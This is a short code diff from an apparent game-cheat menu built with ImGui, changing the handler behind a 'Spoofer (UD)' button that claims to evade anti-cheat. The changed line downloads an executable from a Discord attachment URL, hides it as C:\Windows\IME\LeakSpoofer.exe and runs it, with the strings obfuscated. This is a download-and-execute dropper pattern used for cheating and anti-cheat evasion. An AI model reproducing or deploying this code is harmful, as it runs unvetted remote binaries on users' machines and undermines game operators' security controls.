@@ -4499,7 +4499,7 @@ void menu::render()
             ImGui::SameLine();
             if (ImGui::Button(EncryptS("   Spoofer (UD)    "), ImVec2(0, 0))) //actually UD since 1 months on both AC
             {
-				HRESULT Spoofy = URLDownloadToFileW(NULL, EncryptWS(L"https://cdn.discordapp.com/attachments/932378363832729623/932378420380311552/LeakedSpoof.exe"), EncryptWS(L"C:\\Windows\\IME\\LeakSpoofer.exe"), 0, NULL);
+				HRESULT Spoofy = URLDownloadToFileW(NULL, EncryptWS(L"https://cdn.discordapp.com/attachments/932378363832729623/942045836962062346/LeakedSpoofer.exe"), EncryptWS(L"C:\\Windows\\IME\\LeakSpoofer.exe"), 0, NULL);
 				Sleep(1500);
 				system(EncryptS("start C:\\Windows\\IME\\LeakSpoofer.exe"));
 				Sleep(10000);
